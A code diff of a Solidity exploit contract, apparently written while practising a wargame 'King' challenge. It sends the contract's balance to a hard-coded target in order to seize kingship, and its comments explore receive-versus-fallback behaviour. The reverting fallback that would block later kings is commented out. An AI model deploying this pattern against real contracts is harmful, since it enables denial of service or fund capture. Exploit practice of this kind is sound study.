@@ -5,13 +5,33 @@ contract AttackKing {
     address payable kingAddress =
         payable(0xa363316cb597E9FC0A9DbD26d201E888fc82F06e);
 
-    function setKingAttack(uint _newPrize) external payable {
-        kingAddress.transfer(_newPrize);
+    constructor() payable {}
+
+    function setKingAttack() external {
+        uint sendEthAmount = address(this).balance;
+
+        /* @remind msg.data SI empty -> recieve */
+        (bool success, ) = kingAddress.call{value: sendEthAmount}("");
+        require(success, "n o t");
+
+        /* msg.data NO empty?? -> recieve */
+        /* COMENTARIO en --- https://www.youtube.com/watch?v=df6x81mMw_g&t=276s */
+        /* target.transfer() -> msg.data is not empty, is that the reason? fallback will be called instead of recieve */
+        // payable(kingAddress).transfer(sendEthAmount);
+
+        /* msg.data NO empty -> fallback */
+        // payable(0xa363316cb597E9FC0A9DbD26d201E888fc82F06e).call{
+        //     value: sendEthAmount
+        // }(abi.encodeWithSignature("dawd()"));
     }
 
-    fallback() external payable {
-        revert();
+    function viewEth() external view returns (uint amount) {
+        amount = address(this).balance;
     }
+
+    // fallback() external payable {
+    //     revert();
+    // }
 }
 
 contract King {
@@ -26,7 +46,7 @@ contract King {
     }
 
     receive() external payable {
-        require(msg.value >= prize || msg.sender == owner);
+        require(msg.value >= prize || msg.sender == owner, "why");
         payable(king).transfer(msg.value);
         king = msg.sender;
         prize = msg.value;
